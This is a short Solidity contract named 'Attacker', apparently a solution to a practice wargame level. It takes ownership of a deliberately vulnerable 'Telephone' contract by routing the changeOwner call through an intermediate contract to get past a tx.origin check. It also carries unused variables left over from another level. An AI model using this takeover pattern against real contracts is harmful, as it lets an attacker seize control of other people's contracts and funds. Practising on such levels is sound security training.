// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Telephone.sol";


contract Attacker {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    Telephone telephoneContract = Telephone(0x453003544186687DF714C2e91f10F61aDb559b7d);


    function attack() public {
        telephoneContract.changeOwner(0x80805ae3cbE23715C1f1807A03C5fb669541C2A9);       
    }
}